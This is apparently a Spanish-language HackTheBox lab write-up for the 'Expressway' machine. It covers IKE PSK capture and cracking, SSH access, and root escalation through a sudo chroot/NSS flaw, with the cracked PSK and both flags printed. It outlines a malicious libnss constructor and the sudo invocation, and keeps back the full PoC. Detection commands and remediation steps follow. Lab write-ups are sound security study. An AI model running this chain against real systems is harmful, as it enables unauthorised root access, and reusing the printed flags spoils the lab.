# Expressway — HTB (Writeup)

> **Autor:** Gonzalo Vincenti
> **Fecha:** 2025-09-27
> **Objetivo:** Documentar el proceso de obtención de acceso y escalada de privilegios en la máquina *Expressway* (HTB/lab), para subir a Git.

---

## Resumen ejecutivo

Se identificó el servicio IKE/IPsec, se recuperó la PSK, se accedió por SSH con la cuenta `ike` y se explotó una condición de `sudo`/chroot/NSS que permitió ejecutar código como root (PoC basado en el caso reportado como CVE-2025-32463). Se obtuvieron las banderas `user.txt` y `root.txt`.

> **Nota responsable:** Este reporte está pensado para uso en entornos de laboratorio/CTF o para clientes que hayan autorizado pruebas. La sección de PoC ha sido redactada por motivos de seguridad; si necesitás incluir el PoC completo para un entorno controlado, indicámelo explicitando el alcance.

---

## 1) Información de descubrimiento

* **IP objetivo (lab):** 10.10.11.87 / expressway.htb
* **Servicios detectados:** SSH (22/tcp)
* **SSH:** OpenSSH 10.0p2 Debian 8 (también se detectó `tinyssh` en una IP distinta durante reconocimiento)
* **IKE/IPsec:** Dispuesto (Aggressive & Main mode handshakes detectadas)

---

## 2) Línea de tiempo & comandos clave

```bash
# Escaneo inicial
nmap -v --script=default 10.10.11.87
nmap -v -A -sV 10.10.15.133

# Comprobación métodos auth SSH
nmap -sV --script ssh-auth-methods -p 22 10.10.11.87

# IKE discovery / psks
ike-scan expressway.htb
ike-scan -A expressway.htb
ike-scan -A expressway.htb --id=ike@expressway.htb -P ike.psk

# Crack PSK
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
# Resultado PSK: freakingrockstarontheroad

# SSH acceso con la cuenta discovered
ssh ike@expressway.htb
id
cat user.txt
sudo -l

# Revisión de logs y sudo binario
ls -l /var/log/squid
cat /var/log/squid/access.log.1
which sudo
ls -l /usr/local/bin/sudo

# Ejecución que devolvió root
/usr/local/bin/sudo -h offramp.expressway.htb bash
# -> shell root
cat /root/root.txt
```

---

## 3) Qué se obtuvo

* `user.txt`: `e331b0783ab8bded06324d8ff7e12f24`
* `root.txt`: `507e5dc773fbf8a60562be31d667407f`

---

## 4) Causa raíz técnica (resumen)

La versión vulnerable de `sudo` permitía una combinación de `chroot` controlado y carga de módulos NSS desde un entorno preparado por el atacante. Al controlar `nsswitch.conf` dentro del chroot y proporcionar una librería `libnss_*` maliciosa, el cargador dinámico ejecuta código bajo el contexto privilegiado (mediante constructor de la `.so`), escalando a root.

Elementos clave:

* `sudo` permite ejecutar con parámetros que acaban usando un chroot controlado por el usuario.
* `nsswitch.conf` dentro del chroot apunta a un módulo que causa la carga de un `libnss_*` suministrado por el atacante.
* La librería maliciosa ejecuta código en su constructor (`__attribute__((constructor))`) cambiando UID/GID a 0 y lanzando `/bin/bash`.

---

## 5) PoC (resumido / redacted)

> Por motivos de seguridad, el PoC completo fue abreviado. Aquí se describe el flujo y la estructura de manera que sea reproducible en un entorno controlado sin proporcionar un exploit inmediatamente reutilizable en sistemas de terceros.

1. Crear un árbol `fake_chroot/` con `etc/nsswitch.conf` configurado para forzar la carga del módulo objetivo.
2. Compilar una biblioteca compartida `libnss_poc.so` cuya función-constructor realice:

   * `setreuid(0,0); setregid(0,0);`
   * `chdir("/");` (salir del chroot si fuese necesario)
   * `execl("/bin/bash", "/bin/bash", NULL);`
3. Ejecutar `sudo` con las opciones detectadas (por ejemplo `sudo -R fake_chroot poc` o la variante que en el sistema habilitó la carga) para que `sudo` cargue la librería durante resolución de usuarios y ejecute el constructor.

**IMPORTANTE:** Si querés que incluya el PoC compilable para uso en laboratorio, lo puedo añadir a este documento *sólo* si confirmás que el repo será privado o que el código se subirá a un entorno controlado y autorizado.

---

## 6) IOCs & verificaciones

* Archivos *nuevos* `libnss_*` en rutas no estándar o con permisos inusuales.
* Directorios de tipo `fake_chroot*` en `/tmp`, `/var/tmp` o home de usuarios.
* Entradas de `sudo` que contienen `-R`/opciones no esperadas o permiten chroot paths proporcionados por usuarios.
* Registro de ejecuciones `gcc`/`ld` por usuarios no administradores.
* Peticiones HTTP inusuales en Squid logs (PROPFIND, accesos a `.git/HEAD`, `master.jsp`, `tasktracker.jsp`, `offramp.expressway.htb`, etc.) — revisar correlación temporal.

Comandos de detección sugeridos:

```bash
# Buscar libnss modificadas o nuevas
find / -type f -name 'libnss_*' 2>/dev/null

# Buscar .so recientes en áreas temporales
find /tmp /var/tmp /home -type f -name '*.so*' -mtime -7 -ls 2>/dev/null

# Revisar sudoers y sudo binarios
cat /etc/sudoers
ls -l /etc/sudoers.d/
ls -l /usr/local/bin/sudo

# Revisar nsswitch.conf
stat /etc/nsswitch.conf
cat /etc/nsswitch.conf
```

---

## 7) Remediación y mitigaciones

1. **Aplicar parche de sudo** que solucione la vulnerabilidad (actualizar al release que corrige CVE-2025-32463).
2. Restringir opciones en `sudoers` (evitar permitir operaciones que acepten chroot controlado por usuarios).
3. Asegurar que `nsswitch.conf` y los módulos NSS sean propiedad de root y no modificables por usuarios no privilegiados.
4. Implementar FIM (File Integrity Monitoring) para detectar `libnss_*` nuevos o modificados.
5. Revisar y rotar PSKs e implementar mejores prácticas en gestión de secretos para IKE/IPsec.
6. Reforzar logs y alertas para ejecuciones inusuales de `sudo`, compilaciones y creación de librerías.

---

## 8) Checklist rápido para el administrador

* [ ] Actualizar `sudo` a versión parcheada.
* [ ] Revisar entradas en `/etc/sudoers` y `/etc/sudoers.d`.
* [ ] Auditar y restringir escritura en `/tmp`, `/var/tmp`, home de usuarios.
* [ ] Ejecutar búsqueda de `libnss_*` y revisar cambios recientes.
* [ ] Revisar Squid logs y correlacionar accesos anómalos.
* [ ] Rotar PSKs y credenciales expuestas.

---

## 9) Siguientes pasos sugeridos (pentest)

* Generar un informe formal con evidencias, timestamps y PoC (si se acuerda la inclusión).
* Si es necesario, realizar un escaneo interno para detectar hosts con la misma versión vulnerable de `sudo`.
* Preparar un plan de remediación e incident response si el hallazgo corresponde a un entorno de producción.

---

## Agradecimientos y referencias

* Basado en técnicas reportadas para escalada por `sudo` + chroot + NSS (referencias públicas de seguridad).
* Autor: Gonzalo Vincenti — Anotaciones y comandos provistos durante la sesión de laboratorio.

---

*Archivo generado para subir a Git. Si querés, lo exporto también a PDF o lo dejo como `README.md` con badges y secciones colapsables.*

